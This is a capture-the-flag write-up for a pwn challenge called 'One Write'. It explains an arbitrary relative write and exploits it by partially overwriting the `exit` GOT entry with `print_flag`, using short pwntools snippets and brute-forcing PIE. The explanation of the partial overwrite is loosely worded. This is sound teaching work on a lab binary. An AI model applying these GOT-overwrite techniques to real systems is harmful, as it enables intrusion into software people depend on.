# One Write

**Category:** Mitigations

## Overview
```text
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```
The binary has Partial RELRO enabled, which leaves the GOT writable and therefore vulnerable to overwrite attacks.

```text
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 choice; // [rsp+0h] [rbp-10h]
  unsigned __int64 offset; // [rsp+8h] [rbp-8h]

  init();
  flag_path = getenv("FLAG_PATH");
  if ( !flag_path )
    flag_path = "./flag";
  puts("I can only write one time: either a byte, a short, or an int.");
  puts("What would you like to write?");
  puts("1. Byte");
  puts("2. Short");
  puts("3. Int");
  printf("Choice: ");
  choice = read_byte();
  printf("Offset: ");
  offset = read_long_int();
  printf("Value: ");
  if ( choice == 3 )
  {
    *(int *)((char *)&magic + offset) = read_int();
  }
  else
  {
    if ( choice > 3u )
      goto LABEL_11;
    if ( choice == 1 )
    {
      *((_BYTE *)&magic + offset) = read_byte();
    }
    else
    {
      if ( choice != 2 )
      {
LABEL_11:
        puts("Invalid choice.");
        exit(1);
      }
      *(_WORD *)((char *)&magic + offset) = read_short();
    }
  }
  puts("Thanks! I'll write that for you.");
  exit(0);
}
```
As we can see from the decompiled code we have to choose the type of data to be read; this is then inserted in a place in memory relative to the address of `magic` given an `offset`.


In the binary we have a `print_flag` function that we will use as our win function to print the flag.

## Analysis

In this challenge we have to overwrite the entry in the GOT for `exit` with the address of `print_flag`.

## Vulnerability
Arbitrary write and GOT left writable


## Exploitation

First we have to calculate the offset between `magic` and the `exit` entry in the GOT:

```python
magic_offset = 0x0D8
exit_got_offset = 0x078
offset = int(exit_got_offset) - int(magic_offset)
offset = int(offset)
```

Then the value to insert, since we will use the function `read_short` we will write only 3 snippets in that address, so we have to remove the page from the address and write something in the 4th position.
In this way we have to execute the binary multiple times to get the flag, because the PIE randomization has to coincide with the value in the 4th position.

```python
value = CHALL.symbols['print_flag'] -0x1000 + 0x5000
```

Then simply:

```python
r.recvuntil(b"Choice: ")
r.sendline(b"2")
r.recvuntil(b"Offset: ")
r.sendline(bytes(str(offset),'utf-8'))
r.recvuntil(b"Value: ")
r.sendline(bytes(str(value),'utf-8'))
```

 

